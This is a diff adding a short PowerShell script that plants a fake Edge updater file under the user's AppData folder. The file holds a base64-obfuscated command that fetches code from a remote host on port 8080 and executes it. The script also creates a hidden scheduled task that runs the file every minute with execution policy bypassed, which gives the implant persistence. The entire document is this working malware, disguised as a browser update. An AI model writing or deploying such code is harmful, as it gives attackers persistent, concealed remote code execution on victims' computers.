@@ -1,0 +1,13 @@
+$scriptContent = @'
+
+IEX([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("SQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADIAMAAuADEAMAA6ADgAMAA4ADAALwBlAGQAZwBlAHUAcABkAGEAdABlAA=="))) > $env:USERPROFILE\AppData\Local\Microsoft\Edge\EdgeUpdate.ps1
+
+'@
+
+# Creates persistent scheduled task
+schtasks /create /tn "CheckEdgeUpdate" /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $env:USERPROFILE\AppData\Local\Microsoft\Edge\EdgeUpdate.ps1" /sc minute /mo 1
+
+# Creates fake edge updater ps1 file and writes script content to it 
+New-Item -Path "$env:USERPROFILE\AppData\Local\Microsoft\Edge\EdgeUpdate.ps1" -ItemType File -Force
+Set-Content -Path "$env:USERPROFILE\AppData\Local\Microsoft\Edge\EdgeUpdate.ps1" -Value $scriptContent
+
